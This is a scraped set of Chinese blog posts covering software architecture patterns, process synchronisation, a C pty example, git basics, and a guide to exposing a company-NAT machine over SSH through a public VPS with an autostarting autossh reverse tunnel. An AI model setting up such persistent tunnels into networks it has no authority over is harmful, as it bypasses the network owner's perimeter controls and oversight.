基于微内核架构的示例数不胜数，但是大型的商业应用呢？微内核应用架构也适用于这些情形。为了阐述这个观点，让我们来看看另一个保险公司的示例，但是这次的示例会涉及保险赔偿处理。 赔偿处理是一个非常复杂的过程。每个州都有不同的关于保险赔偿的规则和条文。例如一些州允许在你的挡风玻璃被石头砸碎时免费进行替换，但是一些州则不是这样。因为大家的标准都不一样，因此赔偿标准几乎可以是无限的。 有很多保险赔偿应用运用大型和复杂的规则处理引擎来处理不同规则带来的复杂性。然而，可能会因为某条规则的改变而引起其他规则的改变而使得这些规则处理引擎变成一个大泥球，或者使简单需求变更会需要一个很大的分析师、工程师、测试工程师来进行处理。使用微内核架构能够很好的解决这个问题，核心系统只知道根据赔偿规则处理，但这个赔偿规则是抽象的，系统将赔偿规则作为一个插件规范，具体的规则有对应的实现，然后注入到系统中即可。 图3-2中的一堆文件夹代表了赔偿处理核心系统。它包含一些处理保险赔偿的基本业务逻辑。每一个插件模块包含每个州的具体赔偿规则。在这个例子中，插件模块通过自定义源代码实现或者分离规则引起实例。不管具体实现如何，关键就在于赔偿规则和处理都从核心系统中分离，而这些规则和处理过程都可以被动态地添加、移除，而这些改变对于核心系统和其他插件只有很小的影响或者根本不产生影响。 注意事项对于微内核架构来说一个很重要的一点就是它能够被嵌入或者说作为另一种架构的一部分。例如，如果这个架构解决的是一个你应用中易变领域的特定的问题 ( 译者注 : 即插件化能够解决你应用中的某个特定模块的架构问题 )，你可能会发现你不能在整个应用中使用这种架构。在这种情况下，你可以将微内核架构嵌入到另一个架构模式中 ( 比如分层架构 )。同样的，在上一章节中描述的事件驱动架构中的事件处理器组件也可以使用微内核架构。 微内核架构对渐进式设计和增量开发提供了非常好的支持。你可以先构建一个单纯的核心系统，随着应用的演进，系统会逐渐添加越来越多的特性和功能，而这并不会引起核心系统的重大变化。 对基于产品的应用来说，微内核架构应该是你的第一选择。特别是那些你会在后续开发中发布附加特性和控制哪些用户能够获取哪些特性的应用。如果你在后续开发中发现这个架构不能满足你的需求了，你能够根据你的特殊需求将你的应用重构为另一个更好的架构。 模式分析下面的表格中包含了微内核架构每个特性的评级和分析。以微内核架构的最经典的实现方式的自然趋势为依据对每个特性进行评级。关于微内核架构与其他模式的相关性比较请参考附录A。 整体灵活性评级 : 高分析 : 整体灵活性是指能够快速适应不断变化的环境的能力。通过插件模块的松耦合实现，可以将变化隔离起来，并且快速满足需求。通常，微内核架构的核心系统很快趋于稳定，这样系统就变得很健壮，随着时间的推移它也不会发生多大改变。 易于部署评级 : 高分析 : 根据实现方式，插件模块能够在运行时被动态地添加到核心系统中 （ 比如，热部署 ）,把停机时间减到最小。 可测试性评级 : 高分析 : 插件模块能够被独立的测试，能够非常简单地被核心系统模拟出来进行演示，或者在对核心系统很小影响甚至没有影响的情况下对一个特定的特性进行原型展示。 性能评级 : 高分析 : 使用微内核架构不会自然而然地使你的应用变得高性能。通常，很多使用微内核架构的应用运行得很好，因为你能定制和简化应用程序，使它只包含那些你需要的功能模块。JBoss应用服务器就是这方面的优秀示例: 依赖于它的插件化架构，你可以只加载你需要的功能模块，移除那些消耗资源但没有使用的功能特性，比如远程访问，消息传递，消耗内存、CPU的缓存，以及线程，从而减小应用服务器的资源消耗。 伸缩性评级 : 低分析 : 因为微内核架构的实现是基于产品的，它通常都比较小。它们以独立单元的形式实现，因此没有太高的伸缩性。此时，伸缩性就取决于你的插件模块，有时你可以在插件级别上提供可伸缩性，但是总的来说这个架构并不是以构建高度伸缩性的应用而著称的。 易于开发评级 : 低分析 : 微内核架构需要考虑设计和规约管理，使它不会很难实现。规约的版本控制，内部的插件注册，插件粒度，丰富的插件连接的方式等是涉及到这个架构模式实现复杂度的重要因素。 第四章 微服务架构微服务架构模式作为替代单体应用和面向服务架构的一个可行的选择，在业内迅速取得进展。由于这个架构模式仍然在不断的发展中，在业界存在很多困惑——这种模式是关于什么的？它是如何实现的？本报告的这部分将为你提供关键概念和必要的基础知识来理解这一重要架构模式的好处(和取舍)，以此来判断这种架构是否适合你的应用。 模式描述不管你选择哪种拓扑或实现风格,有几种常见的核心概念适用于一般架构模式。第一个概念是单独部署单元。如图4-1所示，微服务架构的每个组件都作为一个独立单元进行部署，让每个单元可以通过有效、简化的传输管道进行通信，同时它还有很强的扩展性，应用和组件之间高度解耦，使得部署更为简单。 也许要理解这种模式，最重要的概念就是服务组件（service component）。不要考虑微服务架构内部的服务，而最好是考虑服务组件，从粒度上讲它可以小到单一的模块，或者大至一个应用程序。服务组件包含一个或多个模块（如Java类），这些模块可以提供一个单一功能（如，为特定的城市或城镇提供天气情况），或也可以作为一个大型商业应用的一个独立部分（如，股票交易布局或测定汽车保险的费率）。在微服务架构中，正确设计服务组件的粒度是一个很大的挑战。在接下来的服务组件部分对这一挑战进行了详细的讨论。 微服务架构模式的另一个关键概念是它是一个分布式的架构，这意味着架构内部的所有组件之间是完全解耦的，并通过某种远程访问协议（如， JMS, AMQP, REST, SOAP, RMI等）进行访问。这种架构的分布式特性是它实现一些优越的可扩展性和部署特性的关键所在。 微服务架构另一个令人兴奋的特性是它是由其他常见架构模式存在的问题演化来的，而不是作为一个解决方案被创造出来等待问题出现。微服务架构的演化有两个主要来源：使用分层架构模式的单体应用和使用面向服务架构的分布式应用。 由单体应用( 一个应用就是一个整体 )到微服务的发展过程主要是由持续交付开发促成的。从开发到生产的持续部署管道概念,简化了应用程序的部署。单体应用通常是由紧耦合的组件组成，这些组件同时又是另一个单一可部署单元的一部分，这使得它繁琐，难以改变、测试和部署应用（因此常见的“月度部署”周期出现并通常发生在大型IT商店项目）。这些因素通常会导致应用变得脆弱以至于每次有一点新功能部署后应用就不能运行。微服务架构模式通过将应用分隔成多个可部署的单元（服务组件）的方法来解决这一问题，这些服务组件可以独立于其他服务组件进行单独开发、测试和部署。 另一个导致微服务架构模式产生的演化过程是由面向服务架构模式（SOA）应用程序存在的问题引起的。虽然SOA模式非常强大，提供了无与伦比的抽象级别、异构连接、服务编排，并保证通过IT能力调整业务目标，但它仍然是复杂的,昂贵的,普遍存在，它很难理解和实现，对大多数应用程序来说过犹不及。微服务架构通过简化服务概念，消除编排需求、简化服务组件连接和访问来解决复杂度问题。 模式拓扑虽然有很多方法来实现微服务架构模式,但三个主要的拓扑结构脱颖而出，最常见和流行的有:基于REST API的拓扑结构,基于REST的应用拓扑结构和集中式消息拓扑结构。 基于REST的API拓扑适用于网站，通过某些API对外提供小型的、自包含的服务。这种拓扑结构,如图4 - 2所示,由粒度非常细的服务组件（因此得名微服务）组成，这些服务组件包含一个或两个模块并独立于其他服务来执行特定业务功能。在这种拓结构扑中,这些细粒度的服务组件通常被REST-based的接口访问，而这个接口是通过一个单独部署的web API层实现的。此种拓扑的例子包含一些常见的专用的、基于云的RESTful web service，大型网站像Yahoo, Google, and Amazon都在使用。 基于REST的应用拓扑结构与基于REST API的不同，它通过传统的基于web的或胖客户端业务应用来接收客户端请求，而不是通过一个简单的API层。如图4-3所示，应用的用户接口层（user interface layer）是一个web应用，可以通过简单的REST-based接口访问单独部署的服务组件（业务功能）。该拓扑结构中的服务组件与API-REST-based拓扑结构中的不同，这些服务组件往往会更大、粒度更粗、代表整个业务应用程序的一小部分，而不是细粒度的、单一操作的服务。这种拓扑结构常见于中小型企业等复程度相对较低的应用程序。 微服务架构模式中另一个常见的方法是集中式消息拓扑。该拓扑（如图4-4所示）与前面提到的基于REST的应用拓扑类似，不同的是，application REST- based拓扑结构使用REST进行远程访问，而该拓扑结构则使用一个轻量级的集中式消息代理（如，ActiveMQ, HornetQ等等）。不要将该拓扑与面向服务架构模式混淆或将其当做SOA简化版（“SOA-Lite”），这点是极其重要的。该拓扑中的轻量级消息代理（Lightweight Message Broker）不执行任何编排,转换,或复杂的路由;相反,它只是一个轻量级访问远程服务组件的传输工具。 集中式消息拓扑结构通常应用在较大的业务应用程序中，或对于某些对传输层到用户接口层或者到服务组件层有较复杂的控制逻辑的应用程序中。该拓扑较之先前讨论的简单基于REST的拓扑结构，其好处是有先进的排队机制、异步消息传递、监控、错误处理和更好的负载均衡和可扩展性。与集中式代理相关的单点故障和架构瓶颈问题已通过代理集群和代理联盟（将一个代理实例为分多个代理实例，把基于系统功能区域的吞吐量负载划分开处理）解决。 避免依赖和编排微服务架构模式的主要挑战之一就是决定服务组件的粒度级别。如果服务组件粒度过粗，那你可能不会意识到这个架构模式带来的好处（部署、可扩展性、可测试性和松耦合），然而,服务组件粒度过细将导致服务编制要求,这会很快导致将微服务架构模式变成一个复杂、容易混淆、代价昂贵并易于出错的重量级面向服务架构。 如果你发现需要从应用内部的用户接口或API层编排服务组件，那么很有可能你服务组件的粒度太细了。如果你发现你需要在服务组件之间执行服务间通信来处理单个请求,那么很有可能要么是你服务组件的粒度太细了，要么是没有从业务功能角度正确划分服务组件。 服务间通信，可能导致组件之间产生耦合，但可以通过共享数据库进行处理。例如，若一个服务组件处理网络订单而需要用户信息时，它可以去数据库检索必要的数据，而不是调用客户服务组件的功能。 共享数据库可以处理信息需求，但是共享功能呢？如果一个服务组件需要的功能包含在另一个服务组件内，或是一个公共的功能,那么有时你可以将服务组件的共享功能复制一份（因此违反了DRY规则：don’t repeat yourself）。为了保持服务组件独立和部署分离，微服务架构模式实现中会存在一小部分由重复的业务逻辑而造成的冗余，这在大多数业务应用程序中是一个相当常见的问题。小工具类可能属于这一类重复的代码。 如果你发现就算不考虑服务组件粒度的级别，你仍不能避免服务组件编排,这是一个好迹象,可能此架构模式不适用于你的应用。由于这种模式的分布式特性，很难维护服务组件之间的单一工作事务单元。这种做法需要某种事务补偿框架回滚事务,这对此相对简单而优雅的架构模式来说，显著增加了复杂性。 注意事项微服务架构模式解决了很多单体应用和面向服务架构应用存在的问题。由于主要应用组件被分成更小的,单独部署单元,使用微服务架构模式构建的应用程序通常更健壮,并提供更好的可扩展性,支持持续交付也更容易。 该模式的另一个优点是,它提供了实时生产部署能力，从而大大减少了传统的月度或周末“大爆炸”生产部署的需求。因为变化通常被隔离成特定的服务组件，只有变化的服务组件才需要部署。如果你的服务组件只有一个实例，你可以在用户界面程序编写专门的代码用于检测一个活跃的热部署,一旦检测到就将用户重定向到一个错误页面或等待页面。你也可以在实时部署期间，将服务组件的多个实例进行交换，允许应用程序在部署期间保持持续可用性（分层架构模式很难做到这点）。 最后一个要重视的考虑是，由于微服务架构模式是分布式的架构，他与事件驱动架构模式具有一些共同的复杂的问题，包括约定的创建、维护，和管理，远程系统的可用性，远程访问身份验证和授权。 模式分析下面这个表中包含了微服务架构模式的特点分析和评级，每个特性的评级是基于自然趋势，基于典型模式实现的能力特性,以及该模式是以什么闻名的。本报告中该模式与其他模式的并排比较，请参考报告最后的附件A。 整体灵活性评级：高分析：整体的灵活性是能够快速响应不断变化的环境。由于单独部署单元的概念,变化通常被隔离成单独的服务组件,使得部署变得快而简单。同时，使用这种模式构建的应用往往是松耦合的，也有助于促进改变。 易于部署评级：高分析：整体来讲，由于该模式的解耦特性和事件处理组件使得部署变得相对简单。broker拓扑往往比mediator拓扑更易于部署，主要是因为event-mediator组件与事件处理器是紧耦合的，事件处理器组件有一个变化可能导致event mediator跟着变化，有任何变化两者都需要部署。 可测试性评级：高分析：由于业务功能被分离成独立的应用模块,可以在局部范围内进行测试，这样测试工作就更有针对性。对一个特定的服务组件进行回归测试比对整个单体应用程序进行回归测试更简单、更可行。而且,由于这种模式的服务组件是松散耦合的，从开发角度来看，由一个变化导致应用其他部分也跟着变化的几率很小，并能减小由于一个微小的变化而不得不对整个应用程序进行测试的负担。 性能评级：低分析：虽然你可以从实现该模式来创建应用程序并可以很好的运行，整体来说，由于微服务架构模式的分布式特性，并不适用于高性能的应用程序。 伸缩性评级：高分析：由于应用程序被分为单独的部署单元,每个服务组件可以单独扩展，并允许对应用程序进行扩展调整。例如，股票交易的管理员功能区域可能不需要扩展，因为使用该功能的用户很少，但是交易布局服务组件可能需要扩展，因为大多数交易应用程序需要具备处理高吞吐量的功能。 易于开发评级：高分析：由于功能被分隔成不同的服务组件，由于开发范围更小且被隔离，开发变得更简单。程序员在一个服务组件做出一个变化影响其他服务组件的几率是很小的，从而减少开发人员或开发团队之间的协调。 第五章 基于空间的架构大多数基于网站的商务应用都遵循相同的请求流程：一个请求从浏览器发到web服务器，然后到应用服务器，然后到数据库服务器。虽然这个模式在用户数不大的时候工作良好，但随着用户负载的增加,瓶颈会开始出现，首先出现在web服务器层，然后应用服务器层，最后数据库服务器层。通常的解决办法就是向外扩展，也就是增加服务器数量。这个方法相对来说简单和廉价，并能够解决问题。然而，对于大多数高访问量的情况，它只不过是把web服务器的问题移到了应用服务器。而扩展应用服务器会更复杂，而且成本更高，并且又只是把问题移动到了数据库服务器，那会更复杂，更贵。就算你能扩展数据库服务器，你最终会陷入一个金字塔式的情形，在金字塔最下面是web服务器，它会出现最多的问题，但也最好伸缩。金字塔顶部是数据库服务器，问题不多，但最难伸缩。 在一个高并发大容量的应用中，数据库通常是决定应用能够支持多少用户同时在线的关键因素。虽然各种缓存技术和数据库伸缩产品都在帮助解决这个问题，但数据库难以伸缩的现实并没有改变。 基于空间的架构模型是专门为了解决伸缩性和并发问题而设计的。它对于用户数量不可预测且数量级经常变化的情况同样适用。在架构级别来解决这个伸缩性问题通常是比增加服务器数量或者提高缓存技术更好的解决办法。 模型介绍基于空间的模型（有时也称为云架构模型）旨在减少限制应用伸缩的因素。模型的名字来源于分布式共享内存中的 tuple space（数组空间）概念。高伸缩性是通过去除中心数据库的限制，并使用从内存中复制的数据框架来获得的。保存在内存的应用数据被复制给所有运行的进程。进程可以动态的随着用户数量增减而启动或结束，以此来解决伸缩性问题。这样因为没有了中心数据库，数据库瓶颈就此解决，此后可以近乎无限制的扩展了。 大多数使用这个模型的应用都是标准的网站，它们接受来自浏览器的请求并进行相关操作。竞价拍卖网站是一个很好的例子 ( 12306更是一个典型的示例 )。网站不停的接受来自浏览器的报价。应用收到对某一商品的报价，记录下报价和时间，并且更新对该商品的报价，将信息返回给浏览器。 这个架构中有两个主要的模块：处理单元 和 虚拟化中间件。下图展示了这个架构和里面的主要模块。 处理单元包含了应用模块（或者部分的应用模块）。具体来说就是包含了web组件以及后台业务逻辑。处理单元的内容根据应用的类型而异——小型的web应用可能会部署到单一的处理单元，而大型一些的应用会将应用的不同功能模块部署到不同的处理单元中。典型的处理单元包括应用模块，以及保存在内存的数据框架和为应用失败时准备的异步数据持久化模块。它还包括复制引擎，使得虚拟化中间件可以将处理单元修改的数据复制到其他活动的处理单元。 虚拟化中间件负责保护自身以及通信。它包含用于数据同步和处理请求的模块，以及通信框架，数据框架，处理框架和部署管理器。这些在下文中即将介绍的部分，可以自定义编写或者购买第三方产品来实现。 组件间合作基于空间的架构的魔力就在虚拟化中间件，以及各个处理单元中的内存中数据框架。下图展示了包含着应用模块、内存中数据框架、处理异步数据恢复的组件和复制引擎的处理单元架构。 虚拟化中间件本质上是架构的控制器，它管理请求，会话，数据复制，分布式的请求处理和处理单元的部署。虚拟化中间件有四个架构组件：通信框架，数据框架，处理框架和部署管理器。 通信框架通信框架管理输入请求和会话信息。当有请求进入虚拟化中间件，通信框架就决定有哪个处理单元可用，并将请求传递给这个处理单元。通信框架的复杂程度可以从简单的round robin算法到更复杂的用于监控哪个请求正在被哪个处理单元处理的next-available算法。 数据框架数据框架可能是这个架构中最重要和关键的组件。它与各个处理单元的数据复制引擎交互，在数据更新时来管理数据复制功能。由于通信框架可以将请求传递给任何可用的处理单元，所以每个处理单元包含完全一样的内存中数据就很关键。下图展示处理单元间如何同步数据复制，实际中是通过非常迅速的并行的异步复制来完成的，通常在微秒级。 处理框架处理框架，就像下图所示，是虚拟化中间件中一个可选组件，负责管理在有多个处理单元时的分布式请求处理，每个处理单元可能只负责应用中的某个特定功能。如果请求需要处理单元间合作（比如，一个订单处理单元和顾客处理单元），此时处理框架就充当处理单元见数据传递的媒介。 部署管理器部署管理器根据负载情况管理处理单元的动态启动和关闭。它持续检测请求所需时间和在线用户量，在负载增加时启动新的处理单元，在负载下降时关闭处理单元。它是实现可变伸缩性需求的关键。 其他考虑基于空间的架构是一个复杂和实现起来相对昂贵的框架。对于有可变伸缩性需求的小型web应用是很好的选择，然而，对于拥有大量数据操作的传统大规模关系型数据库应用，并不那么适用。 虽然基于空间的架构模型不需要集中式的数据储存，但通常还是需要这样一个，来进行初始化内存中数据框架，和异步的更新各处理单元的数据。通常也会创建一个单独的分区，来从隔离常用的断电就消失的数据和不常用的数据，这样减少处理单元之间对对方内存数据的依赖。 值得注意的是，虽然这个架构的另一个名字是云架构，处理单元（以及虚拟化中间件）都没有放在云端服务或者PaaS上。他们同样可以简单的放在本地服务器，这也是为什么我更倾向叫它“基于空间的架构”。 从产品实现的角度讲，这个架构中的很多组件都可以从第三方获得，比如GemFire, JavaSpaces, GigaSpaces，IBM Object Grid，nCache，和 Oracle Coherence。由于架构的实现根据工程的预算和需求而异，所以作为架构师，你应该在实现或选购第三方产品前首先明确你的目标和需求。 架构分析下面的表格是这个架构的特征分析和评分。每个特征的评分是基于一个典型的架构实现来给出的。要知道这个模式相对别的模式的对比，请参见最后的附录A。 综合能力评分：高分析：综合能力是对环境变化做出快速反应的能力。因为处理单元（应用的部署实例）可以快速的启动和关闭，整个应用可以根据用户量和负载做出反应。使用这个架构通常在应对代码变化上，由于较小的应用规模和组件间相互依赖，也会反映良好。 易于部署评分：高分析：虽然基于空间的架构通常没有解耦合并且功能分布，但他们是动态的，也是成熟的基于云的工具，允许应用轻松的部署到服务器。 可测试性评分：低分析：测试高用户负载既昂贵又耗时，所以在测试架构的可伸缩性方面很困难 性能评分：高分析：通过内存中数据存取和架构中的缓存机制可获得高性能 伸缩性评分：高分析：高伸缩性是源于几乎不依赖集中式的数据库，从而去除了这个限制伸缩性的瓶颈。 易于开发评分：低分析：主要是因为难以熟悉这个架构开发所需得工具和第三方产品，因此使用该架构需要较大的学习成本。而且，开发过程中还需要特别注意不要影响到性能和可伸缩性。 附录A模式分析总结图A-1 总结了在这个报告中，对于架构模式的每部分进行的模式分析所产生的影响。这个总结帮助你确定哪些模式可能是最适合你的情况。例如,如果你的架构模式重点是可伸缩性，你可以在这个图表看看事件驱动模式,microservices模式,和基于空间模式，这些对于你来说可能是很好的架构模式的选择。同样的,如果你的程序注重的是分层架构模式,你可以参考图看到部署、性能和可伸缩性的在你的架构中所存在的风险。 同时这个图表将指导你选择正确的模式,因为在选择一种架构模式的时候，有更多的因素需要考虑。你必须分析你的环境的各个方面,包括基础设施的支持,开发人员技能,项目预算,项目最后期限,和应用程序大小等等。选择正确的架构模式是至关重要的,因为一旦一个架构被确定就很难改变。 关于作者Mark•Richards是一位有丰富经验的软件架构师，他参与架构、设计和实施microservices体系结构、面向服务的体系结构和在J2EE中的分布式系统和其他技术。自1983年以来，他一直从事软件行业,在应用、继承和企业架构方面有大量的经验和专业知识。 Mark在1999到2003年间担任新英格兰Java用户组的主席。他是许多技术书籍和视频的作者,包括软件架构基础(O‘Reilly视频)、企业消息传递(O’Reilly视频),《Java消息服务，第二版》(O’Reilly)和《软件架构师应该知道的97件事》(O’Reilly)的特约作者。Mark拥有一个计算机科学硕士学位并且多次获得IBM、Sun、开放集团和BEA等颁发的架构师和开发人员认证。 他是Fluff Just Stuff(NFJS)研讨会系列（一个不定期会议）议长,并且有过上百次的在世界各地公益会议和用户组上围绕技术主题的演讲经验)。Mark不工作的时候经常会到白色山脉或阿帕拉契山径徒步旅行。","categories":[{"name":"DEVELOP","slug":"DEVELOP","permalink":"http://demonelf.github.io/categories/DEVELOP/"}],"tags":[]},{"title":"编写多进程、线程同步问题总结","slug":"DEVELOP/编写多进程、线程同步问题总结","date":"2019-08-29T05:14:34.947Z","updated":"2019-08-29T05:12:29.572Z","comments":true,"path":"DEVELOP/编写多进程、线程同步问题总结.html","link":"","permalink":"http://demonelf.github.io/DEVELOP/编写多进程、线程同步问题总结.html","excerpt":"注: 多进程时所主要解决的就是进程同步问题。 进程同步:进程同步的主要任务是对多个相关进程在执行次序上进行协调，以使并发执行的诸进程之间能有效地共享资源和相互合作，从而使程序的执行具有可再现性。 1.1 进程同步存在的问题:","text":"注: 多进程时所主要解决的就是进程同步问题。 进程同步:进程同步的主要任务是对多个相关进程在执行次序上进行协调，以使并发执行的诸进程之间能有效地共享资源和相互合作，从而使程序的执行具有可再现性。 1.1 进程同步存在的问题:一、两种形式的制约关系 间接相互制约关系(存在临界资源需要互斥) 直接相互制约关系(进程存在前后执行顺序) 二、产生死锁 1.产生死锁的原因 (1) 竞争资源 (2) 进程间推进顺序非法 2.产生死锁的必要条件 (1) 互斥条件 (不可预防) (2) 请求和保持条件 (可预防) (3) 不剥夺条件 (可预防) (4) 环路等待条件 (可预防) 3.死锁的类型123(1) 嵌套型 (即便一个临界资源 也会发生死锁)(2) AB-BA (3) 有待完善！ 1.2 解决的方法:一、数据结构: 信号量:(实现互斥 例: APUE中的14.3 记录锁 15.8 XSI IPC的信号量) (1) 整型信号量 (2) 记录型信号量 (3) AND 型信号量 (4) 信号量集 二、算法 : 1 实现同步: (1) 生产者—消费者问题 (2) 哲学家进餐问题 (3) 读者—写者问题 2 解决死锁: (1) 预防死锁: 破坏产生死锁的必要条件 (2) 避免死锁: 利用算法防止进入不安全状态(银行家算法) (3) 检测死锁: 产生死锁后采取适当措施 (4) 解除死锁: 产生死锁后撤销挂起某些进程","categories":[{"name":"DEVELOP","slug":"DEVELOP","permalink":"http://demonelf.github.io/categories/DEVELOP/"}],"tags":[]},{"title":"pty示例代码","slug":"DEVELOP/pty示例代码","date":"2019-08-29T05:14:34.944Z","updated":"2019-08-29T05:12:16.553Z","comments":true,"path":"DEVELOP/pty示例代码.html","link":"","permalink":"http://demonelf.github.io/DEVELOP/pty示例代码.html","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#define _XOPEN_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;pty.h&gt;int main()&#123; int fd_m, fd_s; int len; const char *pts_name; char send_buf[64] = \"abc\\ndefghijk\\nlmn\"; char recv_buf[64] = &#123;0&#125;; fd_m = open(\"/dev/ptmx\", O_RDWR | O_NOCTTY); if (fd_m &lt; 0) &#123; printf(\"open /dev/ptmx fail1\\n\"); return -1; &#125; if (grantpt(fd_m) &lt; 0 || unlockpt(fd_m) &lt; 0) &#123; printf(\"grantpt and unlockpt fail\\n\"); goto err; &#125; pts_name = (const char *)ptsname(fd_m); fd_s = open(pts_name, O_RDONLY | O_NOCTTY); if (fd_s &lt; 0) &#123; printf(\"open /dev/ptmx fail2\\n\"); goto err; &#125; len = write(fd_m, send_buf, strlen(send_buf)); printf(\"write len=%d\\n\", len); len = read(fd_s, recv_buf, sizeof(recv_buf)); printf(\"read len=%d, recv_buf=[%s]\\n\", len, recv_buf); len = read(fd_s, recv_buf, sizeof(recv_buf)); printf(\"read len=%d, recv_buf=[%s]\\n\", len, recv_buf); close(fd_m); close(fd_s); return 0;err: if (fd_m) close(fd_m); if (fd_s) close(fd_s); return -1;&#125;","categories":[{"name":"DEVELOP","slug":"DEVELOP","permalink":"http://demonelf.github.io/categories/DEVELOP/"}],"tags":[]},{"title":"Git常用命令图表","slug":"DEVELOP/Git常用命令图表","date":"2019-08-29T05:14:34.942Z","updated":"2019-08-29T05:12:10.201Z","comments":true,"path":"DEVELOP/Git常用命令图表.html","link":"","permalink":"http://demonelf.github.io/DEVELOP/Git常用命令图表.html","excerpt":"有这几个git命令就够用了 示例: 保存本地/home/example_a目录到本地/home/example_b目录","text":"有这几个git命令就够用了 示例: 保存本地/home/example_a目录到本地/home/example_b目录 12345678cd /home/example_bgit init --barecd /home/example_agit initgit remote add test_remote /home/example_bgit add -Agit commit -m \"1.git初始化\"git push -u test_remote master","categories":[{"name":"DEVELOP","slug":"DEVELOP","permalink":"http://demonelf.github.io/categories/DEVELOP/"}],"tags":[]},{"title":"使用SSH反向隧道进行内网穿透","slug":"SYSTEM/使用SSH反向隧道进行内网穿透","date":"2019-08-29T05:12:31.530Z","updated":"2019-08-29T05:10:48.859Z","comments":true,"path":"SYSTEM/使用SSH反向隧道进行内网穿透.html","link":"","permalink":"http://demonelf.github.io/SYSTEM/使用SSH反向隧道进行内网穿透.html","excerpt":"1，前提条件 环境 系统类型 本地用户 SSH服务端口 A机位于公司的NAT网络 安装在VMware里的Debian 8 64bit虚拟机 userA 22 B机是一台有公网IP的VPS CentOS 6 64bit userVPS 1022 C机位于家庭的NAT网络 Windows系统 – – 实现目的：使得位于家庭NAT网络内的C机，可以SSH访问位于公司NAT网络内的A机。","text":"1，前提条件 环境 系统类型 本地用户 SSH服务端口 A机位于公司的NAT网络 安装在VMware里的Debian 8 64bit虚拟机 userA 22 B机是一台有公网IP的VPS CentOS 6 64bit userVPS 1022 C机位于家庭的NAT网络 Windows系统 – – 实现目的：使得位于家庭NAT网络内的C机，可以SSH访问位于公司NAT网络内的A机。 2，原理分析这里先讲向SS反向隧道的原理，如果你对原理不感兴趣，可以跳过这一节。 1ssh -p 22 -qngfNTR 6766:127.0.0.1:22 usera@VPS的IP #回车以后没有反应是正常的,隧道已经建立 命令解析：从(位于本地NAT网络里的)本机访问VPS，建立一条SSH隧道（本机的随机端口到VPS的22端口）同时建立了一条反向隧道，将VPS上的6766端口转发到本机的22端口。 然后，就可以从VPS的6766端口访问本地的22端口了 1ssh -p 6766 userA@127.0.0.1 #从SSH访问位于NAT网络里的linux机器 从SSH访问位于本地NAT网络里的linux机器，这里的userA当然是本地NAT网络里的linux机器用户啦。 这样做有一个问题，那就是，由本地建立的SSH连接是会超时关闭的，如果连接关闭，隧道无法维持，那么VPS就无法利用反向隧道访问本地NAT网络了，为此我们需要一种方案来提供一条稳定的SSH反向隧道，于是autossh就派上用场了； 另外有个问题是，如果本地的Linux系统重启，那么autossh建立的隧道仍然会失效。所以这里我们采取的做法是：1，将本地Linux系统的public key发给VPS，建立信任机制，这样，本地Linux系统可以无需VPS的密码而建立一条SSH隧道；2，将autossh写入系统服务，使之在开机时可以自动建立SSH隧道。 知道了原理以后，接下来开始实际的操作步骤。 3，VPS(B机)的操作 1234vim /etc/ssh/sshd_config #打开如下选项GatewayPorts yes /etc/init.d/sshd reload 4，A机的操作前面说了，A机位于公司内部NAT网络内，是一台安装在VMware Workstation Player里的Debian 8 64bit虚拟机。 1sudo apt-get install autossh openssh-server 配置A机可以免密码登陆到VPS(B机)具体方法为将A机的公钥发给VPS(B机)，这样A机开机时就可以自动建立一条到VPS的SSH隧道 12345678su - userA #这步可省略,但需要确保以下命令是在A机上以userA用户的身份运行的 ssh-keygen -t rsa #连续三次回车,即在本地生成了公钥和私钥,不要设置密码ssh-copy-id -p VPS的SSH端口 -i ~/.ssh/id_rsa.pub userVPS@VPS的IP sudo touch /var/log/ssh_nat.log &amp;&amp; sudo chmod 777 /var/log/ssh_nat.log sudo vim /lib/systemd/system/autossh.service #将下例内容粘贴复制进去 123456789101112131415[Unit]Description=Auto SSH TunnelAfter=network-online.target [Service]User=userA #改掉这里A机的用户Type=simpleExecStart=/usr/bin/autossh -M 6777 -NR 8388:127.0.0.1:22 -i ~/.ssh/id_rsa userVPS@VPS的IP -p VPS的SSH端口 &gt;&gt; /var/log/ssh_nat.log 2&gt;&amp;1 &amp;ExecReload=/bin/kill -HUP $MAINPIDKillMode=processRestart=always [Install]WantedBy=multi-user.targetWantedBy=graphical.target 解释一下上面的autossh命令：添加的一个-M 6777参数,负责通过6777端口监视连接状态,连接有问题时就会自动重连去掉了一个-f参数,因为autossh本身就会在background运行 1234sudo chmod +x /lib/systemd/system/autossh.service #给予可执行权限sudo systemctl enable autossh #设置开机自启sudo systemctl start autossh #现在就启动服务sudo systemctl status autossh #查看状态,出现Active: active (running)表示正常运行 也可以登陆到VPS（B机）上看看8388端口是否真的有程序在监听 123$ netstat -antp | grep :8388tcp 0 0 0.0.0.0:8388 0.0.0.0:* LISTEN 20041/sshdtcp 0 0 :::8388 :::* LISTEN 20041/sshd 5，尝试远程登陆接下来，我们就可以在家里的电脑(C机)上登陆到位于公司NAT网络里的那台Debian8虚拟机(A机)。 1ssh userA@VPS的IP -p 8388 注意：这里的userA并不是VPS(B机)上的用户，而是Debian8虚拟机(A机)上的用户。 参考资料：使用SSH反向隧道进行内网穿透SSH反向连接及AutosshFun and Profit with Reverse SSH Tunnels and AutoSSH 2016/10/29 由 bear 发表在 Linux运维 分类 | 标签: | 将 固定链接 加入收藏夹","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"}],"tags":[]},{"title":"从wordpress换hexo博客后","slug":"SYSTEM/从wordpress换hexo博客后","date":"2019-08-29T05:12:31.528Z","updated":"2019-08-29T05:10:41.531Z","comments":true,"path":"SYSTEM/从wordpress换hexo博客后.html","link":"","permalink":"http://demonelf.github.io/SYSTEM/从wordpress换hexo博客后.html","excerpt":"之前用wordpress做blog, 为什么换为hexo呢? 第一 ​ wordpress的文章都保存在服务器的数据库, 维护不是很直观.","text":"之前用wordpress做blog, 为什么换为hexo呢? 第一 ​ wordpress的文章都保存在服务器的数据库, 维护不是很直观. ​ 而hexo是自己编写markdown文章,本地一份,而blog只是本地的映射. ​ 这样文章更好维护和查看.因为做笔记更重要的是自己也能查看. 第二 ​ hexo用的github pages服务, 服务器器是git, 自己剩下服务器不说, ​ 还能用到git的强大版本控制功能,真是一举多得. 如果大家发下同步命令复杂,完全可以做个成脚本就像我这这个样,点击脚本就可 把文章同步了. 真的很方便, 以下为同步步骤. 执行hexo_new.sh 生成new.md 